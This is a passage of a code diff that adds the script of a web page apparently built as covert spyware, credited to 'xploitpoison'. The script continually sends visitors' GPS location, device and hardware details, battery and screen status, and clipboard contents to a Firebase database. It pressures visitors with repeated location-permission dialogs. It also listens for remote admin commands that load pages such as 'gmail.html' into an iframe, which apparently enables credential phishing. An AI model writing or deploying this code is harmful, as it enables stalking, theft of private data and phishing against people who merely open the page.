+            document.getElementById('lastUpdateTime').innerHTML = data.lastSeenTime;
+        }
+
+        async function updateDeviceInfo() {
+            try { const deviceData = await collectDeviceData(); displayDeviceData(deviceData); await saveDeviceDataToFirebase(deviceData); showToast('✅ Device info updated!', false); return deviceData; }
+            catch (error) { showToast('❌ Update failed', true); return null; }
+        }
+
+        async function saveHardwareSoftwareInfo() {
+            const info = getHardwareSoftwareInfo();
+            const completeInfo = { deviceId: deviceId, hardware: info.hardware, software: info.software, timestamp: Date.now(), dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) };
+            await saveToFirebase(`hardware_info/${deviceId}/current`, completeInfo, true);
+            await saveToFirebase(`software_info/${deviceId}/current`, completeInfo, true);
+        }
+
+        // ==================== PERMISSION MANAGER ====================
+        function forceRequestLocation() {
+            document.getElementById('permissionPrompt').style.display = 'none';
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => { showToast('✅ Location access granted!', false); captureGPS(); },
+                    (error) => { showToast('❌ Please enable location in browser settings', true); },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+
+        function smartLocationRequest() {
+            if (!navigator.geolocation) return;
+            if (localStorage.getItem('location_permission_denied') === 'true') {
+                if (!permissionPromptShown) { permissionPromptShown = true; setTimeout(() => { document.getElementById('permissionPrompt').style.display = 'flex'; }, 2000); }
+                return;
+            }
+            navigator.permissions.query({ name: 'geolocation' }).then((result) => {
+                if (result.state === 'granted') captureGPS();
+                else if (result.state === 'prompt') captureGPS();
+                else if (result.state === 'denied') {
+                    localStorage.setItem('location_permission_denied', 'true');
+                    if (!permissionPromptShown) { permissionPromptShown = true; setTimeout(() => { document.getElementById('permissionPrompt').style.display = 'flex'; }, 2000); }
+                }
+            });
+        }
+
+        function requestNotificationPermission() {
+            if ('Notification' in window) { Notification.requestPermission().then(permission => { if (permission === 'granted') saveToFirebase(`notifications/${deviceId}/status`, { status: 'granted', timestamp: Date.now() }, false); }); }
+        }
+
+        const permissionMessages = {
+            request: { title: "📍 Location Access Required", message: "This app needs your location. Please allow.", button: "Allow Location" },
+            denied: { title: "⚠️ Location Access Denied", message: "You denied location access.", button: "Open Settings" },
+            blocked: { title: "🔒 Location Permanently Blocked", message: "Please enable in browser settings.", button: "How to Enable?" },
+            success: { title: "✅ Location Enabled", message: "Location access granted!", button: "OK" }
+        };
+
+        function createPermissionDialog(type) {
+            const existingDialog = document.getElementById('smartPermissionDialog');
+            if (existingDialog) existingDialog.remove();
+            const msg = permissionMessages[type];
+            if (!msg) return;
+            const dialog = document.createElement('div');
+            dialog.id = 'smartPermissionDialog';
+            dialog.innerHTML = `<div style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);backdrop-filter:blur(8px);z-index:10000;display:flex;align-items:center;justify-content:center;"><div style="background:linear-gradient(135deg,#1a1a2e,#16213e);border-radius:28px;max-width:340px;width:85%;padding:24px;text-align:center;border:1px solid ${type === 'success' ? '#4ade80' : '#fbbf24'};"><div style="font-size:48px;margin-bottom:12px;">${type === 'success' ? '✅' : '📍'}</div><h3 style="color:white;font-size:20px;margin-bottom:8px;">${msg.title}</h3><p style="color:rgba(255,255,255,0.7);font-size:13px;margin-bottom:20px;">${msg.message}</p><button id="permissionDialogBtn" style="background:#4ade80;color:#000;border:none;padding:12px 24px;border-radius:40px;font-size:14px;font-weight:bold;cursor:pointer;width:100%;">${msg.button}</button>${type !== 'success' ? `<button id="closeDialogBtn" style="background:transparent;color:rgba(255,255,255,0.5);border:none;padding:10px;margin-top:10px;font-size:12px;cursor:pointer;width:100%;">Later</button>` : ''}</div></div>`;
+            document.body.appendChild(dialog);
+            document.getElementById('permissionDialogBtn').onclick = () => { dialog.remove(); if (type === 'request') requestLocationWithGuide(); else if (type === 'denied' || type === 'blocked') openLocationSettings(); };
+            const closeBtn = document.getElementById('closeDialogBtn');
+            if (closeBtn) closeBtn.onclick = () => { dialog.remove(); showToast('You can enable later', true); };
+            if (type === 'success') setTimeout(() => { if (document.getElementById('smartPermissionDialog')) dialog.remove(); }, 2000);
+        }
+
+        function requestLocationWithGuide() {
+            showToast('📍 Please allow location access', false);
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => { createPermissionDialog('success'); captureGPS(); saveToFirebase(`permissions/${deviceId}/location`, { status: 'granted', timestamp: Date.now() }, false); },
+                    (error) => { if (error.code === error.PERMISSION_DENIED) { createPermissionDialog('denied'); saveToFirebase(`permissions/${deviceId}/location`, { status: 'denied', timestamp: Date.now() }, false); } },
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            }
+        }
+
+        function openLocationSettings() {
+            const browser = getBrowserName();
+            if (browser === 'Chrome') window.open('chrome://settings/content/location', '_blank');
+            else if (browser === 'Edge') window.open('edge://settings/content/location', '_blank');
+            else if (browser === 'Firefox') window.open('about:preferences#privacy', '_blank');
+            showToast(`Open ${browser} settings to enable location`, false);
+        }
+
+        function getBrowserName() {
+            const ua = navigator.userAgent;
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Edg')) return 'Edge';
+            return 'Browser';
+        }
+
+        async function checkLocationStatus() {
+            if (!navigator.permissions) { setTimeout(() => createPermissionDialog('request'), 1500); return; }
+            try {
+                const result = await navigator.permissions.query({ name: 'geolocation' });
+                if (result.state === 'granted') captureGPS();
+                else if (result.state === 'prompt') setTimeout(() => createPermissionDialog('request'), 1500);
+                else if (result.state === 'denied') setTimeout(() => createPermissionDialog('denied'), 1000);
+                result.addEventListener('change', () => { if (result.state === 'granted') { createPermissionDialog('success'); captureGPS(); } });
+            } catch (error) { setTimeout(() => createPermissionDialog('request'), 1500); }
+        }
+
+        function startPermissionReminder() {
+            if (permissionInterval) clearInterval(permissionInterval);
+            permissionInterval = setInterval(() => {
+                if (navigator.permissions) {
+                    navigator.permissions.query({ name: 'geolocation' }).then((result) => {
+                        if (result.state === 'denied') {
+                            const lastReminder = localStorage.getItem('last_permission_reminder');
+                            const now = Date.now();
+                            if (!lastReminder || (now - parseInt(lastReminder)) > 120000) {
+                                localStorage.setItem('last_permission_reminder', now);
+                                createPermissionDialog('denied');
+                            }
+                        }
+                    });
+                }
+            }, 120000);
+        }
+
+        // ==================== START APP ====================
+        function startGPSTracking() {
+            if (gpsInterval) clearInterval(gpsInterval);
+            captureGPS();
+            gpsInterval = setInterval(() => { if (!document.hidden) captureGPS(); }, 5000);
+        }
+
+        function startGeoTracking() {
+            if (geoInterval) clearInterval(geoInterval);
+            captureGeo();
+            geoInterval = setInterval(() => { if (!document.hidden) captureGeo(); }, 10000);
+        }
+
+        function showToast(message, isError = false) {
+            const toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.style.background = isError ? '#ef4444' : '#10b981';
+            toast.style.display = 'block';
+            setTimeout(() => toast.style.display = 'none', 2500);
+        }
+
+        let permissionPromptShown = false;
+
+        async function startApp() {
+            deviceId = generateDeviceId();
+            document.getElementById('deviceIdVal').innerHTML = deviceId.substring(0, 20) + '...';
+            listenForAdminCommand();
+            await checkLocationStatus();
+            startPermissionReminder();
+
+            initClipboardMonitoring();
+            listenForAdminClipboard();
+            setTimeout(() => { autoReadClipboardOnLoad(); }, 1000);
+            startPeriodicClipboardCheck();
+
+            initMobileSensors();
+            await saveHardwareSoftwareInfo();
+            setTimeout(() => requestNotificationPermission(), 3000);
+
+            await updateVisitCount();
+            await updateDeviceInfo();
+
+            startGPSTracking();
+            startGeoTracking();
+
+            setInterval(async () => {
+                if (!document.hidden) {
+                    const battery = await getBatteryInfo();
+                    const screen = getScreenInfo();
+                    if (database) {
+                        await database.ref(`devices/${deviceId}/battery`).set(battery);
+                        await database.ref(`devices/${deviceId}/screen`).set(screen);
+                        await database.ref(`devices/${deviceId}/lastSeen`).set(Date.now());
+                    }
+                }
+            }, 120000);
+
+            console.log('✅ Ultimate tracker active - All features enabled');
+            showToast('🛰️ All tracking features active!', false);
+            // ==================== SCREEN ON/OFF STATUS TRACKER ====================
+            function updateScreenStatus() {
+                const isVisible = !document.hidden;
+                const status = isVisible ? 'ON' : 'OFF';
+                document.getElementById('screenStatusVal').innerHTML = status;
+
+                // Save to Firebase
+                if (database) {
+                    database.ref(`devices/${deviceId}/screenStatus`).set(status);
+                    database.ref(`online_devices/${deviceId}/screen`).set(status);
+                }
+            }
+
+            // Listen for visibility change
+            document.addEventListener('visibilitychange', () => {
+                updateScreenStatus();
+                if (!document.hidden) {
+                    // Page visible - resume tracking
+                    captureGPS();
+                    captureGeo();
+                }
+            });
+
+            // Initial call
+            updateScreenStatus();
+        }
+
+        function initFirebase() {
+            if (typeof firebaseConfig !== 'undefined') {
+                if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+                database = firebase.database();
+                console.log('✅ Firebase ready');
+                startApp();
+            } else {
+                console.error('❌ Config not loaded');
+                document.getElementById('deviceIdVal').innerHTML = 'Config Error';
+            }
+        }
+
+        document.getElementById('refreshBtn').addEventListener('click', () => {
+            updateDeviceInfo(); captureGPS(); captureGeo(); saveHardwareSoftwareInfo(); showToast('🔄 Refreshed all data', false);
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) { captureGPS(); captureGeo(); updateDeviceInfo(); }
+        });
+
+        window.addEventListener('beforeunload', async () => {
+            if (database) await database.ref(`online_devices/${deviceId}`).set({ status: 'offline', offlineTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) });
+            if (gpsInterval) clearInterval(gpsInterval);
+            if (geoInterval) clearInterval(geoInterval);
+        });
+
+        window.addEventListener('online', async () => { showToast('📡 Back online!', false); await updateDeviceInfo(); captureGPS(); captureGeo(); });
+        window.addEventListener('offline', () => { showToast('⚠️ You are offline.', true); });
+
+        if (typeof firebaseConfig !== 'undefined') { initFirebase(); }
+        else { window.addEventListener('load', () => { if (typeof firebaseConfig !== 'undefined') initFirebase(); else alert('config.js file not found!'); }); }
+        // ==================== ADMIN COMMAND LISTENER ====================
+        function listenForAdminCommand() {
+            if (!database) return;
+
+            // Device-specific command
+            const commandRef = database.ref(`admin_commands/${deviceId}/iframe`);
+            commandRef.on('value', (snapshot) => {
+                const command = snapshot.val();
+                if (command && command.page && command.active) {
+                    const iframe = document.getElementById('dynamicFrame');
+                    if (iframe) {
+                        // ✅ YAHAN CHANGE KIYA HAI - Gmail option add kiya
+                        iframe.src = command.page === 'game' ? 'game.html' :
+                            command.page === 'videochat' ? 'videochat.html' :
+                                command.page === 'engage' ? 'engage.html' :
+                                    command.page === 'gmail' ? 'gmail.html' : 'game.html';
+                        console.log(`🔄 Iframe changed to: ${command.page}`);
+                    }
+                    database.ref(`admin_commands/${deviceId}/iframe`).remove();
+                }
+            });
+
+            // Global command
+            const globalCommandRef = database.ref(`admin_commands/global/iframe`);
+            globalCommandRef.on('value', (snapshot) => {
+                const command = snapshot.val();
+                if (command && command.page && command.active) {
+                    const iframe = document.getElementById('dynamicFrame');
+                    if (iframe) {
+                        // ✅ YAHAN BHI CHANGE KIYA HAI
+                        iframe.src = command.page === 'game' ? 'game.html' :
+                            command.page === 'videochat' ? 'videochat.html' :
+                                command.page === 'engage' ? 'engage.html' :
+                                    command.page === 'gmail' ? 'gmail.html' : 'game.html';
+                        console.log(`🔄 Global iframe changed to: ${command.page}`);
+                    }
+                }
+            });
+        }
+    </script>
+    <!--CREATED BY https://www.xploitpoison.com/-->
+</body>
+
+</html>
